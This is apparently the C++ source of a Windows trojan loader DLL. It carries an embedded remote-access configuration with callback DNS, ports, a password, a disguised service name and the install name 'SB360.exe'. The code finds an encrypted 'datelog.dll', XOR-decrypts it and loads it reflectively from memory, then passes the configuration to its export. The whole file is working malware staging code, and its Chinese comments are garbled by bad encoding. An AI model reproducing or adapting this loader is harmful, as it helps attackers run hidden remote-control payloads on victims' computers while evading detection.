// xydll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"


#include <stdio.h>
#include <strsafe.h>
#include "shlobj.h"
#include <io.h>
#include <imagehlp.h>
#pragma comment(lib,"imagehlp.lib")
#include <wininet.h>
#pragma comment(lib,"wininet.lib")

//#include "decode.h"
#include "MemoryModule.h"

//=============================================================


char strSysPath[MAX_PATH]={0};  //�ؼ�·��
///////////////////////////////////////////////////////////////////////
struct ONLINEINFO
{
	CHAR DNS1[50];      //����DNS 1
	CHAR DNS2[50];      //����DNS 2
	WORD Port1;         //���߶˿� 1
	WORD Port2;         //���߶˿� 2
	CHAR DNSPass[256];  //ͨѶ����
	CHAR szMark[50];    //����汾
	CHAR ServiceName[100];   //��������
	CHAR ServicePlay[128];   //������ʾ
	CHAR ServiceDesc[256];   //��������
	CHAR ReleasePath[100];   //��װ;��
	CHAR ReleaseName[50];    //��װ����
	CHAR szGroup[100];       //���߷���
	CHAR Mexi[100];          //���л���
	BOOL Dele_te;            //��װ��ɾ��
	CHAR Dele_zc;            //��������
	WORD Dele_zd;            //��װ����
	BOOL Dele_fs;            //ռ�ӷ�ɾ����װ
	BOOL Dele_Kzj;           //K�ս���
	CHAR URL[256];
	CHAR RUNURL[256];
	BOOL IP138;            //��װ��ɾ��

	
}m_OnlineInfo=
{
	"127.0.0.1",
		"123456789",
		2014,
		2110,
		"Mother360",
		"V_130305",
		
		"YYYYYYYYYYYY",
		"Yugqqu qekcaigu",
		"Igaoqa ymusuyukeamucgowws",
		"%ProgramFiles%\\Rumno Qrstuv",
		"SB360.exe",
		"Ĭ�Ϸ���",
		"Nmbbre hjveaika",
		0,    //0Ϊ��װ��ɾ��    1Ϊ��װɾ��
		0,    //0Ϊ��ɫ����      1ΪRun����    2Ϊ��������
		0,    //0Ϊ��װ������
		0,    //0Ϊ��ͨ��װ      1Ϊռ�ӷ�ɾ����װ
		0,     //0Ϊ��ͬ��װ      1ΪK�ս��߰�װ
		"",
		"",
		0
};


/////////////////////////////////////////////////////////////////////
#define	MAX_CONFIG_LEN	1024
char * my_strcpy (char * dst, char * src)
{
    char * cp = dst;
	
    while( *cp++ = *src++ );               
    return( dst );
}

char* my_strcat( char * dst , const char * src )  
{  
    char * cp = dst;  
    while( *cp )  
        cp++;                       
    while( *cp++ = *src++ ) ;       
    return( dst );                  
}
int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0)
		da = strlen(str);
	else 
		da = sizes;  
	
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	
				break;   
			if (j == da) 
				return i;   
	}   
	
	return -1;   
}

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//����
{
	unsigned long i;
	unsigned char p;
	p = (unsigned char ) key % 141 + 611;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
//��ȡ�汾��Ϣ����
LPCTSTR FindConfigString(HANDLE	hFile, LPCTSTR lpString)
{
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;

 	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	DWORD filesize=GetFileSize(hFile,NULL);
	lpConfigString = new char[filesize+1];

	ReadFile(hFile, lpConfigString, filesize, &dwBytesRead, NULL);
	int offset = memfind(lpConfigString, lpString, filesize, 0);
	if (offset != -1)
		return lpConfigString + offset;

	delete []lpConfigString;
	return NULL;
}

typedef BOOL (* DLLMain)(char*
						 );     

BOOL strCreateFile(char SysName)
{
	strSysPath[0]=SysName;
	HANDLE hFile = CreateFile(strSysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return TRUE;
	}
	
	// ������ ����Ƿ��ܴ����ļ�
	MakeSureDirectoryPathExists(strSysPath);  //�����ļ���
	hFile = CreateFile(strSysPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;
	
	CloseHandle(hFile);
	return TRUE;
}

BOOL DLLControlway(char *lpDllName)
{
	//  �ؼ�Ĭ��;��
// 	char UQJvH33[] = {'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','A','p','p','P','a','t','c','h','\\','\0'}; //"C:\\Program Files\\AppPatch\\"
    char pBuf[MAX_PATH] = {0};              // ���·���ı���
    GetCurrentDirectory(MAX_PATH, pBuf);    // ��ȡ����ĵ�ǰĿ¼
    strcat(pBuf, "\\"); 
	memset(strSysPath, 0, sizeof(strSysPath));
	my_strcat(strSysPath,pBuf);
	my_strcat(strSysPath, lpDllName);
	
	for(char i=0;i<4;i++)
	{
		if(strCreateFile(i + 65 + 2))
			return TRUE;
	}
	return NULL;
}




//=============================================================


//============================================================



// char New_HttpGet[128] = {'1','2','7','.','0','.','0','.','1','\0'};
char New_ServGet[512] = {'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','\0'};




// lpDllName�ļ�����
void LoadLib(char * lpDllName,BOOL win7 = FALSE)
{
	
	while(1)
	{
		DWORD SleepGet = 1000;
		if(DLLControlway((char *)lpDllName) != FALSE) 
		{
			HANDLE	hDllFile = CreateFile(strSysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			if (hDllFile != INVALID_HANDLE_VALUE)
			{
				char NBRqd01[] = {'S','S','S','S','S','S','V','I','D','\0'};
				char lpDllVid[] = {':','2','0','1','3','-','S','V','1','\0'};  //�ļ�ʶ���ַ���
				const char *strdllf = FindConfigString(hDllFile,NBRqd01);   //��ȡ����汾
				CloseHandle(hDllFile);
				
				if (strdllf )
				{
					strdllf = strdllf + 9;
					if (!strcmp(strdllf,lpDllVid))
					{
	

						hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
						if(hDllFile)
						{
							DWORD  BytesRead;
							int SizeDll  = GetFileSize(hDllFile,0);
							
							unsigned char *MemDll   = (unsigned char *)VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
							
							ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
							CloseHandle(hDllFile);
							
							
							EncryptData((unsigned char *)MemDll , SizeDll,2001);
							
	
					
							HMEMORYMODULE hdllmod = MemoryLoadLibrary(MemDll);
													
							if(hdllmod)
							{
								char p[100] = {0};
								char lzxXn[] = {'f','u','c','k','y','o','u','\0'};

								if (win7)
								{
								//	char fZQvl01[] = {'D','l','l','F','u','U','p','g','r','a','d','r','s','1','\0'};
									lstrcpy(p,lzxXn);
								}else
								{
								//	char fZQvl01[] = {'D','l','l','F','u','U','p','g','r','a','d','r','s','\0'};
									lstrcpy(p,lzxXn);
								}

								DLLMain lpproc = (DLLMain)MemoryGetProcAddress (hdllmod,p);
								if(lpproc!=NULL)
								{
									lpproc((char *)&m_OnlineInfo);

									MemoryFreeLibrary(hdllmod);
									break;
								}
							}
							
							
							
						}
						
					}
				}
			}
			
		}
	}
}

extern "C" __declspec(dllexport) bool Dllxy() 
{ 
//	MessageBox(NULL,TEXT("dll!����"),TEXT("1ƭ���˰�!"),MB_OK);

		BOOL b = FALSE;
/*		char *p = strstr(lpCmdLine,"Win7");
		if (p!=NULL){		
			b = TRUE;
		}else{
	// 		if (lstrlen(m_OnlineInfo.RUNURL)>0)
	// 		{
	// 			HANDLE hHandle = CreateThread(NULL,NULL,Loop_DownManager,(LPVOID)m_OnlineInfo.RUNURL,NULL,NULL);
	// 			WaitForSingleObject(hHandle, INFINITE);
	// 			CloseHandle(hHandle);
	// 		}
		}*/
	
		
		LoadLib("datelog.dll",b);

return false; 
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}

